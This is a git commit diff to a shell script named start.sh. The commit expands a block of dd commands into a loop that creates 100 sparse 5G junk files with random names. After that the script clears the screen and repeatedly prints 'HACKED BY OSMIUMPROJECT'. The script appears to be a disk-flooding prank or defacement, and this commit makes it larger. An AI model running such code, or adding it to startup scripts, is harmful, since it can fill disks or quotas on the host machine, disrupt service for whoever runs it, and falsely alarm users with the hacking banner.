d13bf330427dbe541ad3e85a374019d286a07d1a
salindev <79220416+salindev@users.noreply.github.com>
2023-06-23 11:02:29 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,23 +2,8 @@
 
 random_number=$((RANDOM % 100))
 
-dd if=/dev/zero of=5G17$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G16$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G15$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G14$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G13$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G12$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G11$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G10$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G9$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G8$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G7$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G6$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G5$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G4$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G3$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G2$random_number.test bs=1 count=0 seek=5G
-dd if=/dev/zero of=5G1$random_number.test bs=1 count=0 seek=5G
+for i in {100..1}; do dd if=/dev/zero of=5G$i$random_number.test bs=1 count=0 seek=5G; done
+
 clear
 echo HACKED BY OSMIUMPROJECT
 echo HACKED BY OSMIUMPROJECT
